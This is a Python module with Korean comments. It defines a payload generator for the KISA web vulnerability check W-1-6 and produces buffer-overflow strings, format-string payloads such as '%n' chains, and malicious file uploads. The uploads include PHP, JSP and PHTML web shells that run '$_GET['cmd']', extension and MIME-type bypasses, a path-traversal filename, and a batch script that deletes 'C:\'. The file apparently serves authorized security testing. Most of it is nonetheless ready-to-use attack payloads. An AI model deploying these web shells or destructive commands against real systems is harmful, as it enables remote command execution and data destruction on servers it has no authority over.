"""
KISA 주요정보통신기반시설 기술적 취약점 분석.평가 방법 상세가이드 08.Web
W-1-6 전용 페이로드 (입력 값 크기 및 무결성 검증 오류)

포함 항목 (3개, 67개):
BO  버퍼 오버플로우            24개  CWE-120/121/122
FS  포맷 스트링                28개  CWE-134
FU  파일 업로드 (크기/무결성)  15개  CWE-434

제외 항목 (25개) - 다른 팀원 모듈 담당:
  LI/OC/SI/SS/XI (인젝션), DI/IL/AE (정보노출),
  XS/CS/CF (클라이언트), FD/PT (파일다운로드/경로탐색),
  IA/IN/BF/SE/SF/SC/PR/AU/PV/PL/SN/CC (인증.인가.기타)
"""


class KISAPayloadGenerator:
    """KISA W-1-6 전용 페이로드 생성기."""

    SOURCE_TAG = "kisa"

    # ----------------------------------------------------------------
    # BO: 버퍼 오버플로우 (24개)
    # query 벡터 12개 + body 벡터 12개 = 24개
    # ----------------------------------------------------------------
    def bo_payloads(self):
        patterns = [
            ("A" * 1000,       "bo_1k",     "1KB 오버플로우"),
            ("A" * 10000,      "bo_10k",    "10KB 오버플로우"),
            ("A" * 32768,      "bo_32k",    "32KB WORD 경계"),
            ("A" * 65536,      "bo_64k",    "64KB 버퍼 경계"),
            ("가" * 5000,      "bo_multi",  "멀티바이트 15KB 오버플로우"),
            ("1" * 10000,      "bo_num",    "숫자 10KB 오버플로우"),
            ("!" * 10000,      "bo_spec",   "특수문자 오버플로우"),
            (" " * 10000,      "bo_space",  "공백 오버플로우"),
            ("\t" * 10000,     "bo_tab",    "탭 오버플로우"),
            ("A" * 8192,       "bo_8k",     "8KB 소규모 버퍼"),
        ]
        payloads = []
        for value, name, desc in patterns:
            for vector in ("query", "body"):
                payloads.append({
                    "source": self.SOURCE_TAG,
                    "kisa_code": "BO",
                    "name": "kisa_{}_{}".format(name, vector),
                    "description": "[KISA BO] {} -- {}".format(desc, vector),
                    "attack_vector": vector,
                    "value": value if vector == "query" else {"input": value},
                    "cwe": ["CWE-120", "CWE-121", "CWE-122"],
                    "owasp": "A03:2021",
                })
        return payloads  # 24개

    # ----------------------------------------------------------------
    # FS: 포맷 스트링 (28개)
    # 14 패턴 x 2벡터(query+body) = 28개
    # ----------------------------------------------------------------
    def fs_payloads(self):
        patterns = [
            ("%n" * 10,   "fs_n10",     "KISA 명시: null 포인터 역참조"),
            ("%s" * 10,   "fs_s10",     "KISA 명시: 스택 읽기"),
            ("%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n!",
             "fs_win_n",  "KISA 명시: Windows 포맷스트링 %n"),
            ("%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!",
             "fs_win_s",  "KISA 명시: Windows 포맷스트링 %s"),
            ("%x" * 100,  "fs_x100",    "16진수 스택 덤프"),
            ("%p" * 100,  "fs_p100",    "포인터 주소 노출"),
            ("%.2000d",   "fs_width",   "너비 지정 오버플로우"),
            ("AAAA%x%x%x%x%n", "fs_classic", "고전 익스플로잇 패턴"),
            ("%08x" * 50, "fs_hex50",   "스택 메모리 읽기"),
            ("%d" * 10,   "fs_d10",     "정수 포맷 테스트"),
            ("%f" * 10,   "fs_f10",     "실수 포맷 테스트"),
            ("%c" * 10,   "fs_c10",     "문자 포맷 테스트"),
            ("%u" * 10,   "fs_u10",     "부호없는 정수 포맷"),
            ("%e" * 10,   "fs_e10",     "지수 포맷 테스트"),
        ]
        payloads = []
        for value, name, desc in patterns:
            for vector in ("query", "body"):
                payloads.append({
                    "source": self.SOURCE_TAG,
                    "kisa_code": "FS",
                    "name": "kisa_{}_{}".format(name, vector),
                    "description": "[KISA FS] {} -- {}".format(desc, vector),
                    "attack_vector": vector,
                    "value": value if vector == "query" else {"input": value},
                    "cwe": ["CWE-134"],
                    "owasp": "A03:2021",
                })
        return payloads  # 28개

    # ----------------------------------------------------------------
    # FU: 파일 업로드 크기.무결성 검증 (15개)
    # body(multipart) 전용
    # ----------------------------------------------------------------
    def fu_payloads(self):
        # 매직바이트는 hex 문자열로 보관 (바이너리 오염 방지)
        JAVA_DESER_HEX = "aced0005"    # Java 역직렬화
        PYTHON_PICKLE_HEX = "8004"     # Python pickle
        PE_MAGIC_HEX = "4d5a9000"      # Windows PE
        files = [
            ("shell.php",
             "<?php system($_GET['cmd']); ?>",
             "application/octet-stream",
             "fu_php",
             "PHP 웹쉘 업로드"),
            ("shell.php5",
             "<?php system($_GET['cmd']); ?>",
             "application/octet-stream",
             "fu_php5",
             "PHP5 확장자 우회"),
            ("shell.phtml",
             "<?php system($_GET['cmd']); ?>",
             "application/octet-stream",
             "fu_phtml",
             "PHTML 확장자 우회"),
            ("shell.jsp",
             '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
             "application/octet-stream",
             "fu_jsp",
             "JSP 웹쉘 업로드"),
            ("image.php.jpg",
             "<?php system($_GET['cmd']); ?>",
             "image/jpeg",
             "fu_double_ext1",
             "이중 확장자 우회 (.php.jpg)"),
            ("image.jpg.php",
             "<?php system($_GET['cmd']); ?>",
             "image/jpeg",
             "fu_double_ext2",
             "이중 확장자 우회 (.jpg.php)"),
            ("shell.php",
             "<?php system($_GET['cmd']); ?>",
             "image/jpeg",
             "fu_mime_spoof",
             "MIME Content-Type 위조 (image/jpeg)"),
            ("large.bin",
             "A" * 32768,
             "application/octet-stream",
             "fu_32k",
             "[W-1-6 크기 검증] 32KB 크기 파일"),
            ("huge.bin",
             "A" * 65536,
             "application/octet-stream",
             "fu_64k",
             "[W-1-6 크기 검증] 64KB 크기 파일"),
            ("data.ser",
             JAVA_DESER_HEX,
             "application/octet-stream",
             "fu_java_deser",
             "[W-1-6 무결성 검증] Java 역직렬화 매직바이트 (hex: aced0005)"),
            ("data.pkl",
             PYTHON_PICKLE_HEX,
             "application/octet-stream",
             "fu_python_pickle",
             "[W-1-6 무결성 검증] Python pickle 매직바이트 (hex: 8004)"),
            ("../../../shell.php",
             "<?php system($_GET['cmd']); ?>",
             "application/octet-stream",
             "fu_path_traversal",
             "업로드 경로 탐색 우회"),
            ("malware.exe",
             PE_MAGIC_HEX,
             "application/octet-stream",
             "fu_exe",
             "실행 파일(.exe) 업로드 (PE magic hex: 4d5a9000)"),
            ("script.bat",
             "@echo off\r\ndel /f /s C:\\",
             "application/octet-stream",
             "fu_bat",
             "BAT 스크립트 업로드"),
            ("shell.aspx",
             '<%@ Page Language="C#" %><% Response.Write("pwned"); %>',
             "application/octet-stream",
             "fu_aspx",
             "ASPX 웹쉘 업로드"),
        ]
        payloads = []
        for filename, content, mime, name_tag, desc in files:
            payloads.append({
                "source": self.SOURCE_TAG,
                "kisa_code": "FU",
                "name": "kisa_{}".format(name_tag),
                "description": "[KISA FU] {}".format(desc),
                "attack_vector": "body",
                "value": {
                    "filename": filename,
                    "content": content,
                    "content_type": mime,
                },
                "cwe": ["CWE-434"],
                "owasp": "A05:2021",
            })
        return payloads  # 15개

    # ----------------------------------------------------------------
    # 통합 (67개)
    # ----------------------------------------------------------------
    def get_all_payloads(self):
        return (
            self.bo_payloads()    # 24개
            + self.fs_payloads()  # 28개
            + self.fu_payloads()  # 15개
        )
